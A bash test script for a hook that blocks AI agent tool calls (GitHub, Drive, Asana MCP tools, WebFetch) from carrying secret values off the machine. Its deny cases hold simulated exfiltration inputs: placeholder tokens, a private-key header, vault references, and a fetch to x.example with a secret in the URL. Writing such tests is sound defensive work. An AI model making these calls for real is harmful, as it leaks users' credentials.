#!/bin/bash
# Tests for outbound secret-VALUE egress scanning (#22): a write-capable MCP
# tool (or WebFetch URL) must not carry a secret value off-box. Read-capable
# MCP tools are NOT scanned (a reference passed to a reader is not exfiltration).
#
# Usage: bash tests/hooks/test_egress.sh

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=tests/hooks/helpers.sh
source "${SCRIPT_DIR}/helpers.sh"

echo ""
echo "========================================="
echo " Egress value-scan (check-sensitive.sh)"
echo "========================================="

echo ""
echo -e "${YELLOW}#22: write-capable MCP tools must not send secret values${NC}"

# trunk-ignore-begin(shellcheck/SC2312): jq -n produces static JSON, return value irrelevant
expect_deny_json "github issue_write body w/ 1pw reference" \
  "$(jq -n '{tool_name:"mcp__github__issue_write", tool_input:{title:"t", body:"see op://vault/item/field"}}')"
expect_deny_json "github add_issue_comment w/ priv-key header" \
  "$(jq -n '{tool_name:"mcp__github__add_issue_comment", tool_input:{body:"-----BEGIN PRIVATE KEY-----"}}')"
expect_deny_json "drive create_file w/ google oauth token" \
  "$(jq -n '{tool_name:"mcp__claude_ai_Google_Drive__create_file", tool_input:{content:"ya29.a0AfH6SMBexampletokenvalue"}}')"
expect_deny_json "asana create_tasks w/ gh token" \
  "$(jq -n '{tool_name:"mcp__claude_ai_Asana__create_tasks", tool_input:{html_notes:"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn"}}')"
expect_deny_json "WebFetch url carrying a 1pw reference" \
  "$(jq -n '{tool_name:"WebFetch", tool_input:{url:"https://x.example/?u=op://vault/i/f"}}')"

echo ""
echo -e "${YELLOW}#22: read-capable tools and benign writes still allowed${NC}"

# read-capable MCP tool: a reference passed in is not exfiltration → allow
expect_allow_json "dagster get_run arg w/ 1pw reference (read tool)" \
  "$(jq -n '{tool_name:"mcp__dagster__get_run", tool_input:{runId:"op://vault/i/f"}}')"
expect_allow_json "github issue_write benign body" \
  "$(jq -n '{tool_name:"mcp__github__issue_write", tool_input:{title:"t", body:"normal description text"}}')"
expect_allow_json "WebFetch benign url" \
  "$(jq -n '{tool_name:"WebFetch", tool_input:{url:"https://example.com/docs/guide"}}')"
# trunk-ignore-end(shellcheck/SC2312)

print_summary "Egress value-scan"
